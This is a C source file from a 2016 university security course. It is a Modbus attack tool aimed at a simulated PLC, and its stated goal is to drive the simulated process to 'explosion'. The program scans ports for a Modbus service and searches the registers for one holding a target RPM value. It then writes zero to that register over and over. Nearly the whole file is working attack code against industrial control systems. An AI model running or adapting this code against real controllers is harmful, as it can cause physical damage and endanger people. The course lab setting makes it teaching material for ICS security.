/**********************************************************************
!*
!* 2016 Evan Dye  All Rights Reserved.
!*
!**********************************************************************
!*
!* Author       : Evan Dye
!* Institution  : University of New Mexico
!* Course       : CS-544
!* Semester     : Spring 2016
!*
!*********************************************************************
!******************************************************************************
! Purpose:   To connect to simulated plc and modify RPM register until "expolosion"
!
!*******************************************************************************/

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <modbus.h>

#include "options.h"


int naivePortScan(int startingPort, char *ipAddress)
{
	int i, j; //Used for looping
	int port; //return value
	int err; //Used for checking of modbus calls
	bool badPort;
	modbus_t *modbusConnection;
	uint8_t req_unit8[128]; //used to store exception info
	uint16_t register_values[128]; //registry


	for(i = startingPort; i < 65536; ++i)
	{
		port = i;

		modbusConnection = modbus_new_tcp(ipAddress, port);
		if(modbus_connect(modbusConnection) == -1)
		{
			modbus_free(modbusConnection);
		}
		else
		{
			//Verify that the ip/port pair is likely modbus
			for(j = 0; j < 100; ++j)
			{
				err = modbus_read_registers(modbusConnection, 0, 2, register_values);
				if(err == -1)
				{
					break;
				}
			}
			if(j == 100)
			{
				break; //We've found a port that might work, so break out of the loop
			}
			modbus_close(modbusConnection);
			modbus_free(modbusConnection);
		}
	}
	if(port >= 65536)
	{
		port = -1; //return error
	}

	return port;
}


int main(int argc, char **argv)
{
	int i, j; //used for looping

	int err; //Used for modbus error checking
	options_t options;
	modbus_t *modbusConnection;
	uint8_t req_unit8[128];
	uint16_t register_values[128];

	get_options(argc, argv, &options);
	print_options(&options);

	if(options.port == 0)
	{
		options.port = naivePortScan(1, options.ipAddress);
		if(options.port == -1)
		{
			fprintf(stderr, "No modbus ports found at %s\n", options.ipAddress);
			return -1;
		}
		modbusConnection = modbus_new_tcp(options.ipAddress, options.port);
	}
	else
	{
		modbusConnection = modbus_new_tcp(options.ipAddress, options.port);
		if(modbus_connect(modbusConnection) == -1)
		{
			fprintf(stderr, "Connection failed: %s\n", modbus_strerror(errno));
			modbus_free(modbusConnection);
			return -1;
		}
	}

	//Auto register finding
	if(options.registerAddress == -1)
	{
		i = 0;
		err = 0;
		while(err != -1)
		{
			err = modbus_read_registers(modbusConnection, i, 1, register_values);

			if(abs(register_values[0] - options.targetRPM) <= options.tolerence)
			{
				options.registerAddress = i;
				break;
			}
			++i;
		}
	}
	if(options.registerAddress == -1) //make sure somethine was actually found
	{
			fprintf(stderr, "No registers found within expected range\n");
			modbus_close(modbusConnection);
			modbus_free(modbusConnection);
			return -1;
	}

	//Double check register
	err = modbus_read_registers(modbusConnection, options.registerAddress, 1, register_values);
	if (err == -1)
	{
		fprintf(stderr, "Reading register failed: %s\n", modbus_strerror(errno));
		modbus_close(modbusConnection);
		modbus_free(modbusConnection);
		return -1;
	}


	err = 0;
	i = 0;
	while(err != -1) //Doing it this way for now, will come up with better solution at a later time
	{
		err = modbus_write_register(modbusConnection, options.registerAddress, 0);
		++i;
	}

	//err = modbus_write_register(modbusConnection, options.registerAddress, 0);
	if(err == -1)
	{
		fprintf(stderr, "Writing to register failed on iteration %d: %s\n", i, modbus_strerror(errno));
		modbus_close(modbusConnection);
		modbus_free(modbusConnection);
		return -1;
	}

	modbus_close(modbusConnection);
	modbus_free(modbusConnection);
	return 0;
}

